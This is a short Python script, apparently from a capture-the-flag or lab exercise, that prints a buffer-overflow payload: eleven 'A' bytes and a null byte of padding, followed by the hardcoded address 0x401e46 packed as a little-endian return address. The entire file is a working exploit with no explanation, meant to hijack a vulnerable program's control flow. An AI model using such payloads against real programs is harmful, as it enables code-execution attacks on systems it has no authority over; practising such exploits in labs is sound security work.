#!/usr/bin/env python3

import sys
sys.stdout.buffer.write(b'A' * 11+ b'\0')
sys.stdout.buffer.write(0x401e46.to_bytes(8, 'little'))
